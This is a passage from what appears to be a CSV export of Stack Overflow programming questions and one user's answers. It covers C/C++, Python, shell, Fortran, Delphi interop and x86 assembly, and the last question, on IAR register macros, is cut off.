","9530","","<p>If you use <a href=""http://docs.python.org/library/os.html#os.system""><code>os.system()</code></a> to spawn a process for the <code>wget</code>, it will block until <code>wget</code> finishes the download (or quits with an error).  So, just call <code>os.system('wget blah')</code> in a loop until you've downloaded all of your files.</p>

<p>Alternatively, you can use <a href=""http://docs.python.org/library/urllib2.html""><code>urllib2</code></a> or <a href=""http://docs.python.org/library/httplib.html""><code>httplib</code></a>.  You'll have to write a non-trivial amount code, but you'll get better performance, since you can reuse a single HTTP connection to download many files, as opposed to opening a new connection for each file.</p>
"
"<p>I need your advice on this piece of code:
the table fields options[0], options[1] etc... doesn't seem to be freed correctly.
Thanks for your answers</p>

<pre><code>int main()
{
  ....
  char **options;
  options = generate_fields(user_input);
  for(i = 0; i &lt; sizeof(options) / sizeof(options[0]); i++)  {
    free(options[i]);
    options[i] = NULL;
  }

  free(options);
}

char ** generate_fields(char *) 
{
   char ** options = malloc(256*sizeof(char *));
   ...
   return options;

}
</code></pre>
","9530","","<p>The problem is this:</p>

<pre><code>for(i = 0; i &lt; sizeof(options) / sizeof(options[0]); i++)
</code></pre>

<p><code>options</code> is a pointer type, not an array type, so <code>sizeof(options)</code> will always be the same (typically 4 bytes on a 32-bit machine or 8 bytes on a 64-bit machine), so <code>sizeof(options)/sizeof(options[0])</code> will almost always be 1.</p>

<p>The key is to always <code>free</code> memory in the same manner as you <code>malloc</code>'ed it.  So, if you <code>malloc</code> a 2-dimensional array and then <code>malloc</code> a series of 1-dimensional arrays, you need to do the reverse when freeing it:</p>

<pre><code>char ** generate_fields(char *) 
{
   char ** options = malloc(256*sizeof(char *));
   for(int i = 0; i &lt; 256; i++)
       options[i] = malloc(some_size);
   return options;
}

void free_fields(char ** options)
{
    for(int i = 0; i &lt; 256; i++)
        free(options[i]);
    free(options);
}
</code></pre>

<p>Note that if the size (256 in this case) is not a constant, you need to keep track of it yourself, since otherwise you have no way of knowing how many times to loop when freeing.</p>
"
"<p>I have a variable of type <code>size_t</code>, and I want to print it using <code>printf()</code>. What format specifier do I use to print it portably? </p>

<p>In 32-bit machine, <code>%u</code> seems right. I compiled with g++ -g -W -Wall -Werror -ansi -pedantic, and there was no warning. But when I compile that code in 64-bit machine, it produces warning. </p>

<pre><code>size_t x = &lt;something&gt;;
printf( ""size = %u\n"", x );

warning: format '%u' expects type 'unsigned int', 
    but argument 2 has type 'long unsigned int'
</code></pre>

<p>The warning goes away, as expected, if I change that to <code>%lu</code>.</p>

<p>The question is, how can I write the code, so that it compiles warning free on both 32- and 64- bit machines?</p>

<p>Edit: I guess one answer might be to ""cast"" the variable into an <code>unsigned long</code>, and print using <code>%lu</code>. That would work in both cases. I am looking if there is any other idea.</p>
","9530","","<p>Use the <code>z</code> modifier:</p>

<pre><code>size_t x = ...;
ssize_t y = ...;
printf(""%zu\n"", x);  // prints as unsigned decimal
printf(""%zx\n"", x);  // prints as hex
printf(""%zd\n"", y);  // prints as signed decimal
</code></pre>
"
"<p>It is a compiler error or runtime error? The code below can be compiled! </p>

<pre><code>class Base{
void g();
void h();
};

int main()
{
    Base* p = new Base();
    free(p);
return 0;
}
</code></pre>

<p>However it can't be compiled with a virtual function if I declare the class Base like this </p>

<pre><code>class Base{
virtual void g();
void h();
};
</code></pre>

<p>The code below can be compiled all the time, no matter the function is virtual or not.</p>

<pre><code>class Base{
void g();
void h();
};

int main()
{
    Base* p = (Base*)malloc(sizeof(Base));
    delete p;
return 0;
}
</code></pre>
","9530","","<p>It's <em>undefined behavior</em>.  That means anything could happen -- the program could succeed, it could crash hard, it could silently fail and crash much later in an unrelated innocent-looking piece of code, or it could even erase your hard drive.</p>

<p><em>Anything</em> could happen, since you're doing something the C++ standard says not to do.</p>
"
"<p>Is there a way in Python to access match groups without explicitely creating a match object (or another way to beautify the example below)?</p>

<p>Here is an example to clarify my motivation for the question:</p>

<p>Following perl code </p>

<pre><code>if    ($statement =~ /I love (\w+)/) {
  print ""He loves $1\n"";
}
elsif ($statement =~ /Ich liebe (\w+)/) {
  print ""Er liebt $1\n"";
}
elsif ($statement =~ /Je t\'aime (\w+)/) {
  print ""Il aime $1\n"";
}
</code></pre>

<p>translated into Python</p>

<pre><code>m = re.search(""I love (\w+)"", statement)
if m:
  print ""He loves"",m.group(1)
else:
  m = re.search(""Ich liebe (\w+)"", statement)
  if m:
    print ""Er liebt"",m.group(1)
  else:
    m = re.search(""Je t'aime (\w+)"", statement)
    if m:
      print ""Il aime"",m.group(1)
</code></pre>

<p>looks very awkward (if-else-cascade, match object creation).</p>
","9530","","<p>You could create a helper function:</p>

<pre><code>def re_match_group(pattern, str, out_groups):
    del out_groups[:]
    result = re.match(pattern, str)
    if result:
        out_groups[:len(result.groups())] = result.groups()
    return result
</code></pre>

<p>And then use it like this:</p>

<pre><code>groups = []
if re_match_group(""I love (\w+)"", statement, groups):
    print ""He loves"", groups[0]
elif re_match_group(""Ich liebe (\w+)"", statement, groups):
    print ""Er liebt"", groups[0]
elif re_match_group(""Je t'aime (\w+)"", statement, groups):
    print ""Il aime"", groups[0]
</code></pre>

<p>It's a little clunky, but it gets the job done.</p>
"
"<p>Lets say I have to provide an value as bitmask.</p>

<pre><code>NSUInteger options = kFoo | kBar | kFooBar;
</code></pre>

<p>and lets say that bitmask is really huge and may have 100 options. But which options I have, depends on a lot of situations. How could I dynamically compose such a bitmask?</p>

<p>Is this valid?</p>

<pre><code>NSUInteger options;

if (foo) {
    options = options | kFoo;
}

if (bar) {
    options = options | kBar;
}

if (fooBar) {
    options = options | kFooBar;
}
</code></pre>

<p>(despite the fact that this would probably crash when doing that | bitmask operator thing to ""nothing"".</p>
","9530","","<p>You pretty much have it, except that you need to initialize the bitfield to 0 as you add in more bits:</p>

<pre><code>NSUInteger options = 0;

if (foo) options |= kFoo;
if (bar) options |= kBar;
// etc.
</code></pre>

<p>Also note that a bitfield can only hold a limited number of bits (typically 32 or 64 bits).  If you need more bits (such as the 100 you mentioned), then you need an array of integers, and you need to take special care when setting and getting bits to access the right array element and the right bit of that element.</p>
"
"<p>I'm just digging into the gcc manual and some things are still unclear to me:</p>

<ol>
<li>When specifying a std, should I always use -pedantic in conjunction?</li>
<li>When using -g, it the standard level sufficient or should I specify level 3, i.e.
-g3?</li>
<li>Is it good practice to use -Werror to promote all warnings to errors and -pedantic-errors to promote all pedantic warnings to errors?</li>
</ol>
","9530","","<p>These are all highly subjective.  Here are my opinions:</p>

<ol>
<li><p>Your use of <code>-pedantic</code> shouldn't be tied to your use of <code>-std=foo</code>.  Use <code>-pedantic</code> if you want pedantic errors messages; if you're using <code>-pedantic</code>, you'll probably also want <code>-Wall</code> and <code>-Wextra</code>, since your goal is usually to catch all possible missteps, no matter how minor.  Note that <code>-pedantic</code> will not catch <em>all</em> possible warnings, only the warnings that the ISO C standard requires a diagnostic for.</p></li>
<li><p>I've always found level 2 (the default with <code>-g</code>) to be good enough for my purposes.  Level 3 also includes information about all macro definitions in your program, but that's only useful if your debugger supports macro expansions; mine does not (GNU gdb 6.3.50-20050815 (Apple version gdb-696)).  I don't know what else level 3 includes that level 2 does not.</p></li>
<li><p>That depends.  If your goal is to make the most portable, most standards-compliant code, then yes, I'd highly recommend always using <code>-Werror</code> and <code>-pedantic-error</code> (along with <code>-Wall</code> and <code>-Wextra</code>), especially when starting new projects.  However, if you're starting with a large codebase, turning on these options will likely give you tons of harmless, spurious errors, especially for things like signed/unsigned mismatch and implicit conversions between various types.  It will take you a very long time to fix up a codebase to remove these errors, so I wouldn't recommend it.</p>

<p>If you're doing a quick throwaway project, don't bother, since these will only slow you down.</p>

<p>If you're working on a library or something that will get open sourced, then please do turn these on.  Your users will greatly appreciate the fact that your code does not produce errors or warnings.  Also take <a href=""http://stackoverflow.com/questions/2574200/gcc-using-werror-and-std-pedantic-considered-good-practice/2574456#2574456"">ndim's advice</a> into account.</p></li>
</ol>
"
"<p>I have tried to do fork() and piping in main and it works perfectly fine but when I try to implement it in a function for some reason I don't get any output, this is my code: </p>

<pre><code>void cmd(int **pipefd,int count,int type, int last);    

int main(int argc, char *argv[]) {
int pipefd[3][2];
int i, total_cmds = 3,count = 0;
int in = 1;

for(i = 0; i &lt; total_cmds;i++){
 pipe(pipefd[count++]);
 cmd(pipefd,count,i,0);    
}

 /*Last Command*/
 cmd(pipefd,count,i,1);    

exit(EXIT_SUCCESS);
}

void cmd(int **pipefd,int count,int type, int last){    
    int child_pid,i,i2;

     if ((child_pid = fork()) == 0) {

            if(count == 1){
               dup2(pipefd[count-1][1],1); /*first command*/
            }
            else if(last!=1){
               dup2(pipefd[count - 2][0],0); /*middle commands*/
               dup2(pipefd[count - 1][1],1);
            }
            else if(last == 1){
               dup2(pipefd[count - 1][0],0); /*last command*/
            }


            for(i = 0; i &lt; count;i++){/*close pipes*/
            for(i2 = 0; i2 &lt; 2;i2++){
               close(pipefd[i][i2]);
            }}



            if(type == 0){
                execlp(""ls"",""ls"",""-al"",NULL);
            }
            else if(type == 1){
                execlp(""grep"",""grep"","".bak"",NULL);
            }
            else if(type==2){
                               execl(""/usr/bin/wc"",""wc"",NULL);
            }
            else if(type ==3){
                         execl(""/usr/bin/wc"",""wc"",""-l"",NULL);
           }
            perror(""exec"");
            exit(EXIT_FAILURE);
    }
    else if (child_pid &lt; 0) {
            perror(""fork"");
            exit(EXIT_FAILURE);
    }
}
</code></pre>

<p>I checked the file descriptors and it is opening the right ones, not sure what the problem
could be..</p>

<p>Edit: I Fixed the problem but I'm having child processes, which way would be the best to wait for the child , while(wait(NULL)!=-1); but that hangs</p>
","9530","","<p>The problem is that <code>pipefd</code> is not an <code>int**</code>, it's an <code>int[3][2]</code>, so when you pass it to <code>cmd</code>, you get garbage.  Your compiler <em>should</em> be giving you a warning on each call to <code>cmd()</code>, such as something like this:</p>

<pre><code>warning: passing argument 1 of 'cmd' from incompatible pointer type
</code></pre>

<p>If not, turn up your warning level.</p>

<p>It's true that arrays decay into pointers to their first elements, so you can pass a 1-D array to a function expecting a pointer, but <strong>that's only true for the first dimension of arrays</strong>.  In particular, a 2D array does <strong>not</strong> decay into a pointer to a pointer.  It decays at the first level only, so <code>pipefd</code> can decay into the type <code>int (*)[2]</code>, which is read as ""pointer to array 2 of <code>int</code>""</p>

<p>So, the correct way to write <code>cmd</code> is this:</p>

<pre><code>void cmd(int (*pipefd)[2],int count,int type, int last)
</code></pre>
"
"<p>I wanted to store 10 in 4th position of array of 5 positions. How to do ?</p>

<pre><code>int main( ) 
{  
    int a[5] = {,,,,4} ;
    return 0; 
}
</code></pre>

<p>If i do that i get error. Please help.</p>

<p>Thanks in advance. </p>
","9530","","<p>If you're using C99, you can use a feature called <em>designated initializers</em> to initialize particular array elements.  In this case, you would do this:</p>

<pre><code>int a[5] = { [4] = 4 };
</code></pre>

<p>which initializes the element at index 4 to 4, and all of the other elements to 0.</p>

<p>GCC also provides this feature <a href=""http://gcc.gnu.org/onlinedocs/gcc-3.3.6/gcc/Designated-Inits.html"" rel=""nofollow"">as an extension</a> to the C language, but keep in mind this is not valid ISO C90, nor is it valid in C++.  It is valid in C99 only.</p>
"
"<p>I was attempting to do a <code>sed</code> replacement in a binary file however I am beginning to believe that is not possible.  Essentially what I wanted to do was similar to the following:</p>

<pre><code>sed -bi ""s/\(\xFF\xD8[[:xdigit:]]\{1,\}\xFF\xD9\)/\1/"" file.jpg
</code></pre>

<p>The logic I wish to achieve is: scan through a binary file until the hex code <code>FFD8</code>, continue reading until <code>FFD9</code>, and only save what was between them (discards the junk before and after, but include <code>FFD8</code> and <code>FFD9</code> as the saved part of the file)</p>

<p>Is there a good way to do this?  Even if not using <code>sed</code>?</p>

<p><strong>EDIT:</strong>  I just was playing around and found the cleanest way to do it IMO.  I am aware that this grep statement will act greedy.</p>

<pre><code>hexdump -ve '1/1 ""%.2x""' dirty.jpg | grep -o ""ffd8.*ffd9"" | xxd -r -p &gt; clean.jpg
</code></pre>
","9530","","<p>sed might be able to do it, but it could be tricky.  Here's a Python script that does the same thing (note that it edits the file in-place, which is what I assume you want to do based on your sed script):</p>

<pre><code>import re

f = open('file.jpeg', 'rb+')
data = f.read()
match = re.search('(\xff\xd8[0-9A-fa-f]+)\xff\xd9', data)
if match:
    result = match.group(1)
    f.seek(0)
    f.write(result)
    f.truncate()
else:
    print 'No match'
f.close()
</code></pre>
"
"<p>I have a post-build script after building my c# project that will place one of the dll files in a specific directory.  This dll is saved in SVN.  My question is, is there a way that when building my project, it knows that this dll has not changed and would know not to be copied over to the directory so the there will not be a modified copy for the SVN?</p>
","9530","","<p>The quick and easy way is to stat both files and compare their modification times -- only copy the file if the DLL in the destination directory is older than the one you're copying.</p>

<p>A more robust but slower way is to use any number of <a href=""http://linux.die.net/man/1/diff"" rel=""nofollow"">diff</a> programs to compare the two DLLs byte-for-byte.</p>
"
"<p>I found this command line search and replace example:</p>

<pre><code>find . -type f -print0 | xargs -0 sed -i 's/find/replace/g'
</code></pre>

<p>It worked fine except it changed the date and file ownership on EVERY file it searched through, even those that did not contain the search text.</p>

<p>What's a better solution to this task?</p>
","9530","","<p>The easiest way to fix that would be to only execute sed on the files if the contain the text by using grep first:</p>

<pre><code>find . -type f | while read file; do
    grep -q find $file &amp;&amp; sed -i 's/find/replace/g' $file
done
</code></pre>

<p>This does require reading each file twice (in the worst case), so it might be a little slower.  Hopefully, though, your OS should keep the file in its disk cache, so you shouldn't see much of a slowdown, since this process is definitely I/O-bound, not CPU-bound.</p>
"
"<p>I have to design and implement a Fortran routine to determine the size of clusters on a square lattice, and it seemed extremely convenient to code the subroutine recursively. However, whenever my lattice size grows beyond a certain value (around 200/side), the subroutine consistently segfaults. Here's my cluster-detection routine:</p>

<pre><code>RECURSIVE SUBROUTINE growCluster(lattice, adj, idx, area)
    INTEGER, INTENT(INOUT)  :: lattice(:), area 
    INTEGER, INTENT(IN)     :: adj(:,:), idx

    lattice(idx) = -1
    area = area + 1

    IF (lattice(adj(1,idx)).GT.0) &amp;
        CALL growCluster(lattice,adj,adj(1,idx),area)

    IF (lattice(adj(2,idx)).GT.0) &amp;
        CALL growCluster(lattice,adj,adj(2,idx),area)

    IF (lattice(adj(3,idx)).GT.0) &amp;
        CALL growCluster(lattice,adj,adj(3,idx),area)

    IF (lattice(adj(4,idx)).GT.0) &amp;
        CALL growCluster(lattice,adj,adj(4,idx),area)
END SUBROUTINE growCluster
</code></pre>

<p>where adj(1,n) represents the north neighbor of site n, adj(2,n) represents the west and so on. What would cause the erratic segfault behavior? Is the cluster just ""too huge"" for large lattice sizes?</p>
","9530","","<p>I think you're running into a stack overflow.  If your lattice is over 200 units per side, that's 40,000 units, which means you're recursing 40,000 times.  Depending on your stack size and your stack frame size, you could easily be running out of stack space.</p>

<p>You'll have to convert your algorithm into one that uses less stack space in order to handle larger lattices.  <a href=""http://en.wikipedia.org/wiki/Flood_fill#Alternative_implementations"" rel=""nofollow"">Wikipedia</a> provides a few implementations (in pseudocode) on how to do a flood fill without blowing your stack.</p>
"
"<p>I'm having a slight problem with my SDL/Opengl code, specifically, when i try to do something on a mousebuttondown event, the program sends an sdl_quit event to the stack, closing my application.</p>

<p>I know this because I can make the program work (sans the ability to quit out of it :| ) by checking for SDL_QUIT during my event loop, and making it do nothing, rather than quitting the application.</p>

<p>If anyone could help make my program work, while retaining the ability to, well, close it, it'd be much appreciated. Code attached below:</p>

<pre><code>#include ""SDL/SDL.h""
#include ""SDL/SDL_opengl.h""

void draw_polygon();
void init();

int main(int argc, char *argv[])
{

    SDL_Event Event;
    int quit = 0;
    GLfloat color[] = { 0.0f, 0.0f, 0.0f };

    init();

    glColor3fv (color);
    glOrtho(0.0, 1.0, 0.0, 1.0, -1.0, 1.0);
    draw_polygon();

    while(!quit)
    {
        while(SDL_PollEvent( &amp;Event )) 
        {
            switch(Event.type)
            {
                case SDL_MOUSEBUTTONDOWN:
                    for (int i = 0; i &lt;= sizeof(color); i++)
                    {
                        color[i] += 0.1f;
                    }
                    glColor3fv ( color );
                    draw_polygon();
                                    break;

                case SDL_KEYDOWN:
                    switch(Event.key.keysym.sym)
                    {
                        case SDLK_ESCAPE:
                            quit = 1;
                                                    break;
                        default:
                            break;
                    }

                default:
                    break;
            }
        }
    }

    SDL_Quit();
    return 0;
}

void draw_polygon() 
{
    glBegin(GL_POLYGON);
        glVertex3f (0.25, 0.25, 0.0);
        glVertex3f (0.75, 0.25, 0.0);
        glVertex3f (0.75, 0.75, 0.0);
        glVertex3f (0.25, 0.75, 0.0);
    glEnd();
    SDL_GL_SwapBuffers();
}

void init()
{
    SDL_Init(SDL_INIT_EVERYTHING);
    SDL_SetVideoMode( 640, 480, 32, SDL_OPENGL );
    glClearColor (0.0, 0.0, 0.0, 0.0);  
    glMatrixMode( GL_PROJECTION | GL_MODELVIEW );
    glLoadIdentity(); 
    glClear (GL_COLOR_BUFFER_BIT);
    SDL_WM_SetCaption( ""OpenGL Test"", NULL );
}
</code></pre>

<p>If it matters in this case, I'm compiling via the included compiler with Visual C++ 2008 express.</p>
","9530","","<p>You're missing a <code>break</code> statement in the end of your <code>SDL_MOUSEBUTTONDOWN</code> event handler, resulting in unintentional fall-through to the <code>SDL_KEYDOWN</code> handler.  Just add a <code>break</code> after the call to <code>draw_polygon()</code> and you're good to go; you should also add a <code>break</code> to the end of your <code>SDL_KEYDOWN</code> handler to avoid falling through into the <code>default</code> case, though that's not a problem now since the <code>default</code> case doesn't do anything, but if it does in the future, you'll have another bug.</p>

<p><strong>EDIT</strong></p>

<p>You also have a buffer overflow.  <code>sizeof(color)</code> is the total size in bytes of the array, which in this case is 12 (3 values times 4 bytes/value).  So, you're looping 13 times (12, plus 1 for using <code>&lt;=</code> instead of <code>&lt;</code>) instead of 3 when changing the color.  It just happens that the compiler has laid out the local variable <code>quit</code> immediately after <code>color</code>, so you're accidentally writing out over <code>quit</code>, plus other unknown data on the stack.</p>

<p>The fix for this is to divide by the size of the array member when calculating the number of members.  This is often done using a macro:</p>

<pre><code>#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
...
for (int i = 0; i &lt; ARRAY_SIZE(color); i++)
</code></pre>

<p>You could also just hardcode the number of color components (3), which isn't likely to change -- you're also hardcoding this implicitly in the call to <code>glColor3fv()</code>.</p>
"
"<p>I am experiencing a problem with a C program running on Windows XP that is getting Permission Denied (EACCES) errors when it tries to call system(). </p>

<p>It doesn't seem to matter what I put in the command string, the commands all work manually but get Permission Denied errors when executed via system()</p>

<p>The other interesting thing is that the program works correctly on other XP machines, just not this one. That makes it feel like some kind of OS setting, but I am not totally sure what system() does under the hood and would like to understand what is happening here.</p>

<p>Here is my test code:</p>

<pre><code>fprintf( stderr, ""DEBUG: Running test of system(NULL) call...\n"" );
if ( ( ret = system( NULL ) ) != 0)
    fprintf( stderr, ""  DEBUG: ret: %d: errno: %d, %s\n"", ret, errno, strerror( errno ) );

fprintf( stderr, ""DEBUG: Running test of system(\""sleep 1\"") call...\n"" );
if ( ( ret = system( ""sleep 1"" ) ) != 0 )
    fprintf( stderr, ""  DEBUG: ret: %d: errno: %d, %s\n"", ret, errno, strerror( errno ) );
</code></pre>

<p>This produces an output of</p>

<pre><code>DEBUG: Running test of system(NULL) call...
  DEBUG: ret: 1: errno: 0, No error
DEBUG: Running Test of system(""sleep 1"") call...
  DEBUG: ret: -1: errno: 13, Permission denied
</code></pre>

<p>Thanks.</p>

<p>UPDATE: I have also modified my code to use CreateProcess() instead of system(), and I still get an ""Access Denied"" error (5). This makes it sound even more like an OS setting, but I don't know where to look.</p>

<p>UPDATE2: Process Monitor shows the failure in a call to ""QueryOpen"" for the path ""D:\cmd.exe"", which does not exist. All the other calls are for C:\WINDOWS\system32\cmd.exe, so I don't know why the one call is bad.</p>
","9530","","<p>Have you tried running your program with <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow"">Process Monitor</a>?  Process Monitor will show you all of the system calls your program makes, plus lots of other metadata about the calls (such as their arguments and their return values).  It can help you debug why you're getting the ""Permission Denied"" error.</p>
"
"<p><strong>Update</strong>,</p>

<p>I tried removing the static modifier, and I tried putting them in a namespace (as well as both of those), and none worked.
<br /><br /><br />
Hi,</p>

<p>I have a header file with common constants like names and stuff that are automatically included in each project (an example follows). The thing is that they are included in the compiled binary (EXE) whether they are used (referenced) or not. If I use DEFINEs instead, then naturally they are not included if they are not used, but of course consts are better than defines so… I tried Googling it, but the closest thing I could find was <a href=""http://stackoverflow.com/questions/1229430/how-do-i-prevent-my-unused-global-variables-being-compiled-out"">a question</a> right here on SO that did not quite help. Matters of i18n aside, how can I keep the ones that are not used out of the binary, while still keeping it easy to use like this?</p>

<p>Thanks.
<br /><br /><br /></p>

<pre><code>//COMMON.H:
  static const CString s_Company _T(""Acme inc."");
  //etc. others
  static const CString s_Digits  _T(""0123456789"");

//TEST.CPP:
  #include common.h
  int main() {
    AfxMessageBox(s_Company);
  }

  //s_Company should be in the final EXE, but s_Digits should not be, but is
</code></pre>
","9530","","<p>The reason they're not stripped from the binary is because they <em>are</em> used: <code>CString</code> is not a POD type, so when you create instances of them at global scope, the compiler has to generate code to call their constructors and destructors.</p>

<p>If you want unused symbols to be stripped, just replace the <code>CString</code>s with a POD type such as <code>const TCHAR*</code>:</p>

<pre><code>static const TCHAR *s_Company = _T(""Acme inc."");
static const TCHAR *s_Digits  = _T(""0123456789"");
</code></pre>

<p>Then, the unused constants will be stripped from your binary automatically by the compiler.  However, one important thing to keep in mind is that if your strings are used in multiple files, then your binary will have multiple copies of those strings in it, one copy for each translation unit that uses the string.  Not even gcc's <code>-fmerge-constants</code> option seems to fix this.  If you don't want this to happen, you'll need to use <code>extern</code> declarations in your header files and then put the string constants' values in source files (usually in one file, but that's not required).  This also allows you to change the constants without needing to recompile every file that uses them.</p>
"
"<p>I have some MSVC++ compiled DLL's for which I have created COM-like (lite) interfaces (abstract Delphi classes).  Some of those classes have methods that need pointers to objects.  These C++ methods are declared with the <strong>__thiscall</strong> calling convention (which I <em>cannot change</em>), which is just like __stdcall, except a <strong>this</strong> pointer is passed on the ECX register.</p>

<p>I create the class instance in Delphi, then pass it on to the C++ method.  I can set breakpoints in Delphi and see it hitting the exposed __stdcall methods in my Delphi class, but soon I get a STATUS_STACK_BUFFER_OVERRUN and the app has to exit.  Is it possible to emulate/deal with __thiscall on the Delphi side of things?  If I pass an object instantiated by the C++ system then all is good, and that object's methods are called (as would be expected), but this is useless - I need to pass Delphi objects.</p>

<blockquote>
  <p><strong>Edit 2010-04-19 18:12</strong> This is what happens in more detail: The first
  method called (setLabel) exits with no
  error (though its a stub method). The
  second method called (init), enters
  then dies when it attempts to read the
  <em>vol</em> parameter.</p>
</blockquote>

<p><strong>C++ Side</strong></p>

<pre><code>#define SHAPES_EXPORT __declspec(dllexport) // just to show the value
class SHAPES_EXPORT CBox
{
  public:
    virtual ~CBox() {}
    virtual void init(double volume) = 0;
    virtual void grow(double amount) = 0;
    virtual void shrink(double amount) = 0;
    virtual void setID(int ID = 0) = 0;
    virtual void setLabel(const char* text) = 0;
};
</code></pre>

<p><strong>Delphi Side</strong></p>

<pre><code>IBox = class
public
  procedure destroyBox; virtual; stdcall; abstract;
  procedure init(vol: Double); virtual; stdcall; abstract;
  procedure grow(amount: Double); virtual; stdcall; abstract;
  procedure shrink(amount: Double); virtual; stdcall; abstract;
  procedure setID(val: Integer); virtual; stdcall; abstract;
  procedure setLabel(text: PChar); virtual; stdcall; abstract; 
end;

TMyBox = class(IBox)
protected
  FVolume: Double;
  FID: Integer;
  FLabel: String; //
public
  constructor Create;
  destructor Destroy; override;
  // BEGIN Virtual Method implementation
  procedure destroyBox; override; stdcall;             // empty - Dont need/want C++ to manage my Delphi objects, just call their methods
  procedure init(vol: Double); override; stdcall;      // FVolume := vol;
  procedure grow(amount: Double); override; stdcall;   // Inc(FVolume, amount);
  procedure shrink(amount: Double); override; stdcall; // Dec(FVolume, amount);
  procedure setID(val: Integer); override; stdcall;    // FID := val;
  procedure setLabel(text: PChar); override; stdcall;  // Stub method; empty.
  // END Virtual Method implementation      
  property Volume: Double read FVolume;
  property ID: Integer read FID;
  property Label: String read FLabel;
end;
</code></pre>

<p>I would have half expected using stdcall alone to work, but something is messing up, not sure what, perhaps something to do with the ECX register being used?  Help would be greatly appreciated.</p>

<blockquote>
  <p><strong>Edit 2010-04-19 17:42</strong> Could it be that the ECX register needs to be
  preserved on entry and restored once
  the function exits? Is the <em>this</em>
  pointer required by C++? I'm probably
  just reaching at the moment based on
  some intense Google searches.   I
  found <a href=""https://forums.embarcadero.com/thread.jspa?threadID=32132&amp;tstart=29"" rel=""nofollow"">something related</a>, but it
  seems to be dealing with the reverse
  of this issue.</p>
</blockquote>
","9530","","<p><strong>Don't do this</strong>.</p>

<p>As Ori mentioned, the C++ ABI is not standardized.  You cannot and should not expect this to work, and if you do manage something, it will be an incredibly non-portable hack.</p>

<p>The standard way of bootstrapping C++ function calls across language boundaries is to use static functions where you explicitly pass in a <code>this</code> parameter:</p>

<pre><code>class SHAPES_EXPORT CBox
{
  public:
    virtual void init(double volume) = 0;
    static void STDCALL CBox_init(CBox *_this, double volume) { _this-&gt;init(volume); }
    // etc. for other methods
};
</code></pre>

<p>(Actually, the static method should technically be declared <code>extern ""C""</code>, since static class methods aren't guaranteed to be implemented with the C ABI, but pretty much all compilers in existence do so.)</p>

<p>I don't know Delphi at all, so I don't know what the proper way to handle this on the Delphi side of things is, but this is what you need to do on the C++ side.  If Delphi supports the cdecl calling convention, then you can remove the <code>STDCALL</code> above.</p>

<p>Yes, this is annoying in that you have to call <code>CBox_init</code> instead of <code>init</code> from Delphi, but that's just something you have to deal with.  You can rename <code>CBox_init</code> to something more suitable if you like, of course.</p>
"
"<p>I can use <code>__LINE__</code> as a method parameter just fine, but I would like an easy way to use it in a function that uses strings.</p>

<p>For instance say I have this:</p>

<pre><code>11    string myTest()
12    {
13     if(!testCondition)
14       return logError(""testcondition failed"");
15    }
</code></pre>

<p>And I want the result of the function to be: </p>

<blockquote>
  <p>""myTest line 14: testcondition failed""</p>
</blockquote>

<p>How can I write logError? Does it have to be some monstrosity of a macro?</p>
","9530","","<p>Why do you even need it as a string?  What's wrong with an integer?  Here are two ways you could write <code>logError()</code>:</p>

<pre><code>#define logError(str) fprintf(stderr, ""%s line %d: %s\n"", __FILE__, __LINE__, str)

// Or, forward to a more powerful function
#define logError(str) logError2(__FILE__, __LINE__, str)
void logError2(const char *file, int line, const char *str);
</code></pre>

<p>If you really need the line as a string, you can use the stringizing operator <code>#</code>, but because of the way macros work, you'll need to wrap it in two macros:</p>

<pre><code>#define STRINGIZE(x) STRINGIZE2(x)
#define STRINGIZE2(x) #x
#define LINE_STRING STRINGIZE(__LINE__)
</code></pre>

<p>And now <code>LINE_STRING</code> is a macro that will expand to a string containing the current line number wherever it is expanded.  If you only had one level of macros (i.e. if you had <code>#define STRINGIZE(x) #x</code>), then you would get the literal string <code>""__LINE__""</code> every time you expanded it, which is not what you want.</p>
"
"<p>I've got a compiler error but I can't figure out why.</p>

<p>the .hpp:</p>

<pre><code>#ifndef _CGERADE_HPP
#define _CGERADE_HPP
#include ""CVektor.hpp""
#include &lt;string&gt;

class CGerade
{

protected:
    CVektor o, rv;

public:

    CGerade(CVektor n_o, CVektor n_rv);

    CVektor getPoint(float t);

    string toString();
};
</code></pre>

<p>the .cpp:</p>

<pre><code>#include ""CGerade.hpp""

CGerade::CGerade(CVektor n_o, CVektor n_rv)
{
    o = n_o;
    rv = n_rv.getUnitVector();
}
</code></pre>

<p>the error message:</p>

<pre><code>CGerade.cpp:10: error: no matching function for call to ‘CVektor::CVektor()’
CVektor.hpp:28: note: candidates are: CVektor::CVektor(float, float, float)
CVektor.hpp:26: note:                 CVektor::CVektor(bool, float, float, float)
CVektor.hpp:16: note:                 CVektor::CVektor(const CVektor&amp;)
CGerade.cpp:10: error: no matching function for call to ‘CVektor::CVektor()’
CVektor.hpp:28: note: candidates are: CVektor::CVektor(float, float, float)
CVektor.hpp:26: note:                 CVektor::CVektor(bool, float, float, float)
CVektor.hpp:16: note:                 CVektor::CVektor(const CVektor&amp;)
</code></pre>
","9530","","<p>Your <code>CVektor</code> class has no default constructor (that is, one that takes no arguments), so your <code>CGerade</code> constructor can't call it.  Since you're not explicitly calling a <code>CVektor</code> constructor in your initializer list, the compiler implicitly tries to call the default constructor, but there is none to call, so you get an error.</p>

<p>You should explicitly call the <code>CVektor</code> copy constructor using an initializer list:</p>

<pre><code>CGerade::CGerade(CVektor n_o, CVektor n_rv)
    : o(n_o), rv(n_rv.getUnitVector())
{
    // empty body
}
</code></pre>
"
"<p>When I use <code>ADC</code> for exmaple:</p>

<pre><code>AL = 01 and BL = 02, and CF = 1
</code></pre>

<p>when I make this: </p>

<pre><code>ADC AL,BL 
</code></pre>

<p>Will <code>AL</code> be <code>3</code> or <code>4</code>? (with the <code>CF</code> addition or without?)</p>
","9530","","<p>It will be 4.  ADC (add with carry) adds in an extra 1 if the carry flag (CF) is 1.  See the full description of the opcode <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/ADC.htm"" rel=""nofollow"">here</a>.</p>
"
"<p>I am attempting to alter an IAR specific header file for a lpc2138 so it can compile with Visual Studio 2008 (to enable compatible unit testing).</p>

<p>My problem involves converting register definitions to be hardware independent (not at a memory address)</p>

<p>The ""IAR-safe macro"" is:</p>

<pre><code>#define __IO_REG32_BIT(NAME, ADDRESS, ATTRIBUTE, BIT_STRUCT) \
                    volatile __no_init ATTRIBUTE union       \
                     {                                       \
                       unsigned long NAME;                   \
                       BIT_STRUCT NAME ## _bit;              \
                     } @ ADDRESS
//declaration
//(where __gpio0_bits is a structure that names 
//each of the 32 bits as P0_0, P0_1, etc)
